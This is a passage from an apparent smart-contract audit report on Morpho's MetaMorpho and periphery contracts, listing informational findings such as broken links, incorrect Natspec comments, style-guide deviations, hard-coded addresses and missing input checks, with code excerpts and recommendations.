The [link](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol) in the `AggregatorV3Interface` links to an invalid destination. The file was removed and the page returns a 404 error. 

**Recommendation**:

Replace the link with the correct link: https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol



### Incorrect link in IAaveV2 interface

**Severity:** Informational

**Context:** [IAaveV2.sol#L161-L161](morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol#L161-L161)

**Description**:

The IAaveV2 interface includes a link to a website that is not existing anymore `https://developers.aave.com`. This can lead to confusion for users trying to use the link and looks unprofessional.

**Recommendation**:

It is recommended to either remove the link or replace it with an updated working link.



### Invalid comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

-  The [CompoundV2MigrationBundler Natspec comment  for `compoundV2Repay()`](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L38) below is invalid.

    
    ```
    /// @dev Initiator must have previously transferred their assets to the bundler.
    ```
    It also handles repaying Compound Ether positions and these can be sent along with the transactions.

- The [WNativeBundler Natspec comment](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L45) for `wrapNative()` below is invalid.

  ```
  /// @dev Initiator must have previously transferred their native tokens to the bundler.
  ```
  
  It handles native tokens which can be sent along with the transaction rather than from a transaction in 
  the bundle before the `wrapNative` call.

- The Natspec comment below from the `morphoWithdraw` function of the MorphoBundler contract is invalid.

  ```
  /// @param slippageAmount The minimum amount of supply shares to burn in exchange for `assets` when it is used.
    /// The maximum amount of assets to withdraw in exchange for `shares` otherwise.
  ```
  It should be (we replace minimum with maximum and vice versa): 

    ```
  /// @param slippageAmount The maximum amount of supply shares to burn in exchange for `assets` when it is used.
    /// The minimum amount of assets to withdraw in exchange for `shares` otherwise.
  ```

- The Natspec comment below from the `hasPermission` function in ERC20PermissionedBase contract is invalid.

  ```
      /// @dev Returns true if `account` has no permission.
  ```
  It should be:
  ```
      /// @dev Returns false if `account` has no permission.
  ```
  Because the function checks if the account has permission and returns false if it doesn't.

- `sortWithdrawQueue` in the `updateWithdrawQueue()` Natspec from MetaMorpho is an invalid name. It seems to be the former name of `updateWithdrawQueue()` and should be replaced with it.
  
**old Natspec comment**
  ```
      /// @notice Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the
    /// vault so the call to `sortWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can
    /// simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`. 
  ```

  **new Natspec comment**
    ```
        /// @notice Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the
      /// vault so the call to `updateWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can
      /// simply bundle a reallocation that withdraws max from this market with a call to `updateWithdrawQueue`. 
    ```
  
- The comments below from the `_withdraw` function in MetaMorpho are invalid:
  ```
      /// 3. NotEnoughLiquidity when withdrawing more than vault's total assets.
      // @audit-low invalid statement NotEnoughLiquidity is not returned when the balance being withdrawn is less than available liquidity.
      /// 4. NotEnoughLiquidity when withdrawing more than `owner`'s balance but less than the available liquidity. 
  ```
The first comment should be:
```
3. NotEnoughLiquidity when withdrawing more than available liquidity.
```

  The second comment shouldn't be a part of the list as no error is returned when a user withraws more than his balance but less than available liquidity.




### Add inline comments for unnamed variables	_(duplicate of [Add inline comments for unnamed variables])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
This concerns functions with parameters that are missing descriptive inline comments for these parameters. The absence of clear naming for these variables could lead to misunderstandings and hinders the readability of the code.

For example, change `function foo(address x, address)` to `function foo(address x, address /* y */)`.

<details>
```solidity
📁 File: metamorpho/src/MetaMorpho.sol

531:     function maxDeposit(address) public view override returns (uint256) { 

536:     function maxMint(address) public view override returns (uint256) { 
```
[531](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531-L531), [536](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536-L536)

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

34:     function onMorphoSupply(uint256, bytes calldata data) external { 

39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external { 

44:     function onMorphoRepay(uint256, bytes calldata data) external { 

49:     function onMorphoLiquidate(uint256, bytes calldata data) external { 

54:     function onMorphoFlashLoan(uint256, bytes calldata data) external { 
```
[34](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34-L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39-L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44-L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49-L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54-L54)

</details>

- Recommendation
- Add inline comments to unnamed variables for clarity. For example, change `function foo(address x, address)` to `function foo(address x, address /* y */)`.
- Ensure consistency in naming conventions throughout the codebase.



### address shouldn't be hard-coded	_(duplicate of [Hardcoded `address` should be avoided])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The code in [`MainnetLib.sol`](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol) has constant variables of hard-coded addresses, which can be suboptimal for maintainability and flexibility in different deployment environments.

Hard-coding addresses in smart contracts in general can lead to challenges, especially when deploying the same contract across multiple networks. It necessitates recompiling the contract whenever there's a need to change these addresses, which is inefficient and error-prone.

- Instances
1. `WETH` address hard-coded at [Line 6](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L6-L6)
2. `WST_ETH` address hard-coded at [Line 9](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L9-L9)
3. `DAI` address hard-coded at [Line 12](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L12-L12)

- Recommendation
Instead of using `constant` for address declarations, it is advisable to declare them as `immutable`. This can be achieved by assigning these addresses through constructor arguments. This approach enhances flexibility, allowing the same codebase to be used across various networks without the need for recompilation when addresses change.



### Codebase should implement formal verification testing

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The current codebase lacks formal verification testing, an essential practice in smart contract development. Formal verification involves using mathematical methods to prove or disprove the correctness of the underlying algorithms of a system. It ensures that the code adheres to a specified formal specification, property, or invariant. This is especially critical in blockchain environments where code immutability and financial implications demand high levels of reliability and security.

- Recommendation
**Integration of Formal Verification Tools:** Integrate tools like [SMTChecker](https://docs.soliditylang.org/en/latest/smtchecker.html) and [Certora Prover](https://www.certora.com/) into the development process. These tools are designed for smart contracts, providing an automated way to verify that the code meets its specifications.

**Benefits of Implementation:**
- Enhances the reliability and security of the smart contracts.

Implementing formal verification testing is not just a technical enhancement but a critical step towards ensuring the robustness and trustworthiness of the smart contract ecosystem



### Consider adding a block/deny-list	_(duplicate of [Consider adding a deny-list])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description

As stated in the protocol’s whitepaper the main goal for Morpho is to allow permissionless lending/borrowing for everyone, but in the crypto space, this is almost always abused for profit by the users. 
Currently `MetaMorphoFactory::createMetaMorpho` can be called with any arbitrary loan token, even reentrant ERC777 tokens, and various [weird ERC20 tokens](https://github.com/d-xo/weird-erc20).

Additionally, Morpho-Blue doesn’t have any blacklist functionality as well, which increases the chances for malicious Metamorpho contract owner to use broken tokens as `_asset`, either accidentally or on purpose.

- Recommendation

Consider adding **blacklist** mapping with some type of access control to `MetaMorphoFactory`. That will disincentivize contract owners to pass inappropriate ERC20 loan tokens:

```solidity
mapping(address token => bool isBlocked) public blacklist;

modifier onlyNonBlacklisted(address asset) {
	require(!blacklist[asset], ErrorsLib.TokenBlacklisted());
	_;
}

function createMetaMorpho(
        address initialOwner,
        uint256 initialTimelock,
        address asset,
        string memory name,
        string memory symbol,
        bytes32 salt
    ) external onlyNonBlacklisted(asset) returns (MetaMorpho metaMorpho)

function addToBlacklist(address token, bool isBlocked) external {
	blacklist[token] = isBlocked;
} 
```

Despite that they can avoid this restriction by directly deploying Metamorpho contract without the factory contract.



### Consider adding emergency-stop functionality in `MetaMorpho.sol` contract	_(duplicate of [Consider adding emergency-stop functionality])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The current implementation of [`MetaMorpho.sol`](https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol) contract lacks a emergency-stop mechanism, also known as a `circuit breaker`. In the event of a security breach or other critical emergencies, the ability to immediately suspend all protocol operations is essential. Without such a mechanism, responding to threats can be inefficient and slow, potentially leading to exacerbated risks and damages.

- Recommendation
Implement a 'circuit breaker' or 'emergency stop' functionality at the system architecture level. This feature should enable the instantaneous halting of all protocol operations across the entire platform.



### Missing timelock for fee change	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Informational

**Context:** [MetaMorpho.sol#L233-L233](metamorpho/src/MetaMorpho.sol#L233-L233)

**Description:**

In the MetaMorpho library, functions exist that enable the owner to modify critical state variables such as the the fee imposed on a market. However, these modifications can impact users, and it would enhance the user experience if there were time locks implemented for these functions. A time lock would allow users to adapt to upcoming changes and reduce the potential for abrupt disruptions.

**Recommendation:**

To improve the user experience and provide users with a grace period to adjust, consider adding a time lock to the function responsible for setting fees. The time lock mechanism would introduce a delay between the initiation of the change and its execution, allowing users to anticipate and prepare for adjustments. This enhancement promotes a smoother transition for users and reduces the likelihood of sudden, unexpected changes.



### `constant` should be defined rather than using magic numbers

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The codebase demonstrates instances where magic numbers (unnamed numerical constants) are used directly in expressions. This practice can obscure the meaning of these numbers, making the code less readable and more challenging to maintain. Even in complex areas like assembly code, replacing magic numbers with named constants is beneficial.

- Instances
1. In `AdaptiveCurveIrm.sol`, line [163](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L163): The expression involves arithmetic operations with a magic number.
2. In `ChainlinkOracle.sol`, line [108](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L108): The calculation includes a magic number without clear context.

<details>

```solidity
📁 File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

163:                 avgRateAtTarget = (startRateAtTarget + endRateAtTarget + 2 * midRateAtTarget) / 4; 
```
[163](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L163)

```solidity
📁 File: morpho-blue-oracles/src/ChainlinkOracle.sol

108:                 36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals 
```
[108](https://github.com/morpho-org/morpho-blue-oracles/blob/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L108)

</details>

- Recommendation
Replace all magic numbers with appropriately named constants. This change should clarify the purpose and context of these numbers.



### UniversalRewardsDistributor.sol and MetaMorpho.sol contracts implements interfaces without extending this interfaces

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The codebase for `UniversalRewardsDistributor.sol` and `MetaMorpho.sol` contracts have instances where contracts implement interfaces but do not properly extend these interfaces. This can lead to potential issues with function signatures, resulting in unexpected behavior. Explicitly indicating interface implementation using the `override` keyword is necessary to ensure clarity and correctness.

- Instances
1. **MetaMorpho Contract**: In `MetaMorpho.sol`, line [43](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L43-L43), the contract is implementing `IMetaMorphoStaticTyping` but does not use the `override` keyword for its functions.
2. **UniversalRewardsDistributor Contract**: In `UniversalRewardsDistributor.sol`, line [18](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L18-L18), the contract is implementing `IUniversalRewardsDistributorStaticTyping` without using `override` for the respective functions.

- Recommendation Migration Steps
**Refactor to Extend Interfaces**: Ensure that all contracts explicitly extend the interfaces they implement. This includes adding the `override` keyword to all functions that are part of the interface.

**Benefits of Implementation**
- Properly implementing interfaces with the `override` keyword ensures that the correct function signatures are used, preventing unexpected behaviors.



### Control structures do not follow the Solidity Style Guide

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The code istances below demonstrates multiple instances where control structures do not align with the [Solidity Style Guide](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures). Adhering to these guidelines is crucial for maintaining code consistency, readability, and clarity, which are vital for collaborative development and code maintenance.

<details>

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
628:     function _maxWithdraw(address owner) 
629:         internal
630:         view
631:         returns (uint256 assets, uint256 newTotalSupply, uint256 newTotalAssets)
632:     {

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
711:     function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) 
712:         internal
713:         override
714:     {

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
730:     function _accruedSupplyBalance(MarketParams memory marketParams, Id id) 
731:         internal
732:         returns (uint256 assets, uint256 shares, Market memory market)
733:     {
```
[628](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628-L632), [711](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L711-L714), [730](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L730-L733)

```solidity
📁 File: morpho-blue-bundlers/src/ERC4626Bundler.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
28:     function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver) 
29:         external
30:         payable
31:         protected
32:     {

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
53:     function erc4626Deposit(address vault, uint256 assets, uint256 minShares, address receiver) 
54:         external
55:         payable
56:         protected
57:     {

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
84:     function erc4626Withdraw(address vault, uint256 assets, uint256 maxShares, address receiver, address owner) 
85:         external
86:         payable
87:         protected
88:     {

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
110:     function erc4626Redeem(address vault, uint256 shares, uint256 minAssets, address receiver, address owner) 
111:         external
112:         payable
113:         protected
114:     {
```
[28](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L28-L32), [53](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L57), [84](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L84-L88), [110](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L110-L114)

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit 'else' should be placed on the same line as the 'if'’s closing brace with one space between } and 'else'
109:         if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
110:         else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit 'else' should be placed on the same line as the 'if'’s closing brace with one space between } and 'else'
159:         if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
160:         else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit 'else' should be placed on the same line as the 'if'’s closing brace with one space between } and 'else'
193:         if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
194:         else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit 'else' should be placed on the same line as the 'if'’s closing brace with one space between } and 'else'
218:         if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
219:         else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
227:     function morphoWithdrawCollateral(MarketParams calldata marketParams, uint256 assets, address receiver) 
228:         external
229:         payable
230:         protected
231:     {
```
[109](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109-L110), [159](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L159-L160), [193](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L193-L194), [218](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L218-L219), [227](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L227-L231)

```solidity
📁 File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
28:     function approve2(IAllowanceTransfer.PermitSingle calldata permitSingle, bytes calldata signature, bool skipRevert) 
29:         external
30:         payable
31:         protected
32:     {
```
[28](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L28-L32)

```solidity
📁 File: morpho-blue-bundlers/src/PermitBundler.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
22:     function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert) 
23:         external
24:         payable
25:         protected
26:     {
```
[22](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22-L26)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
24:     function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert) 
25:         external
26:         payable
27:         protected
28:     {
```
[24](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L24-L28)

```solidity
📁 File: morpho-blue-bundlers/src/migration/AaveV3OptimizerMigrationBundler.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
56:     function aaveV3OptimizerWithdraw(address underlying, uint256 amount, uint256 maxIterations) 
57:         external
58:         payable
59:         protected
60:     {
```
[56](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3OptimizerMigrationBundler.sol#L56-L60)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit opening brace should be on the same line as the declaration
/// @audit opening brace should be preceded by a single space
115:     function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof) 
116:         external
117:         returns (uint256 amount)
118:     {
```
[115](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L115-L118)

</details>

- Recommendation
**Refactoring to Follow Style Guide**: Refactor the identified instances to align with the Solidity Style Guide. This includes placing opening braces on the same line as the declaration and ensuring proper placement of 'else' keywords.

**Benefits of Implementation**
- Enhanced Code Readability and Consistency: Adhering to a standardized style guide improves code readability and consistency across the codebase.



### Custom error without details	_(duplicate of [Custom error has no error details])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
Currently the whole codebase of `Metamorpho and Periphery`, several custom error declarations lack detailed parameters, which would otherwise offer context about the cause or nature of the error. Including parameters in error messages is crucial for debugging and understanding the reasons behind contract execution failures.

- Instances
<details>

```solidity
📁 File: metamorpho/src/libraries/ErrorsLib.sol

12:     error ZeroAddress(); 

15:     error NotCuratorRole(); 

18:     error NotAllocatorRole(); 

21:     error NotGuardianRole(); 

24:     error NotCuratorNorGuardianRole(); 

37:     error MaxFeeExceeded(); 

40:     error AlreadySet(); 

43:     error AlreadyPending(); 

58:     error NoPendingValue(); 

61:     error NotEnoughLiquidity(); 

64:     error MarketNotCreated(); 

67:     error MarketNotEnabled(); 

70:     error AboveMaxTimelock(); 

73:     error BelowMinTimelock(); 

76:     error TimelockNotElapsed(); 

79:     error MaxQueueLengthExceeded(); 

82:     error ZeroFeeRecipient(); 

85:     error InconsistentReallocation(); 

88:     error AllCapsReached(); 
```
[12](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L12), [15](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L15), [18](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L18), [21](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L21), [24](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L24), [37](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L37), [40](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L40), [43](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L43), [58](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L58), [61](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L61), [64](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L64), [67](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L67), [70](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L70), [73](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L73), [76](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L76), [79](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L79), [82](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L82), [85](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L85), [88](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L88)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3Optimizer.sol

24:     error InvalidSignatory(); 
```
[24](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L24)

</details>

- Recommendation
Refactor the custom errors to include parameters that provide context.

Detailed error messages simplify the process of debugging and understanding why a transaction failed.



### Function ordering does not follow the Solidity style guide

**Severity:** Informational

**Context:** [BaseBundler.sol#L42-L42](morpho-blue-bundlers/src/BaseBundler.sol#L42-L42)

**Description:**

Maintaining a consistent and organized code structure is essential for readability and ease of understanding. According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be arranged in a specific order: constructor(), receive(), fallback(), external, public, internal, private. This guideline aids developers in quickly locating different types of functions within the codebase.

**Recommendation:**

To align with best practices and the Solidity style guide, consider moving the extSloads() function to its appropriate place in the order of functions. This adjustment contributes to a more organized and maintainable codebase.



### Empty bytes check is missing	_(duplicate of [Empty `bytes` check is missing])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
Currently `Metamorpho and Periphery` codebase demonstrates several instances where functions accept byte-type parameters without validating their non-emptiness. Passing empty bytes can lead to unexpected behaviors, such as incorrect results, failed operations, or unnecessary gas consumption. Ensuring that byte parameters are not empty is crucial for the reliable and secure execution of smart contracts.

- Instances
<details>

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit data
34:     function onMorphoSupply(uint256, bytes calldata data) external { 

/// @audit data
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external { 

/// @audit data
44:     function onMorphoRepay(uint256, bytes calldata data) external { 

/// @audit data
49:     function onMorphoLiquidate(uint256, bytes calldata data) external { 

/// @audit data
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external { 

/// @audit data
90:     function morphoSupply( 
91:         MarketParams calldata marketParams,
92:         uint256 assets,
93:         uint256 shares,
94:         uint256 slippageAmount,
95:         address onBehalf,
96:         bytes calldata data
97:     ) external payable protected {

/// @audit data
120:     function morphoSupplyCollateral( 
121:         MarketParams calldata marketParams,
122:         uint256 assets,
123:         address onBehalf,
124:         bytes calldata data
125:     ) external payable protected {

/// @audit data
174:     function morphoRepay( 
175:         MarketParams calldata marketParams,
176:         uint256 assets,
177:         uint256 shares,
178:         uint256 slippageAmount,
179:         address onBehalf,
180:         bytes calldata data
181:     ) external payable protected {

/// @audit data
244:     function morphoLiquidate( 
245:         MarketParams calldata marketParams,
246:         address borrower,
247:         uint256 seizedAssets,
248:         uint256 repaidShares,
249:         uint256 maxRepaidAssets,
250:         bytes memory data
251:     ) external payable protected {

/// @audit data
263:     function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable protected { 

/// @audit data
272:     function _callback(bytes calldata data) internal { 
```
[34](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34-L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39-L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44-L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49-L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54-L54), [90](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L90-L97), [120](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L120-L125), [174](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L174-L181), [244](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L244-L251), [263](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L263-L263), [272](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L272-L272)

```solidity
📁 File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit signature
28:     function approve2(IAllowanceTransfer.PermitSingle calldata permitSingle, bytes calldata signature, bool skipRevert) 
29:         external
30:         payable
31:         protected
32:     {
```
[28](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L28-L32)

```solidity
📁 File: morpho-blue-bundlers/src/PermitBundler.sol

/// @audit r
/// @audit s
22:     function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert) 
23:         external
24:         payable
25:         protected
26:     {
```
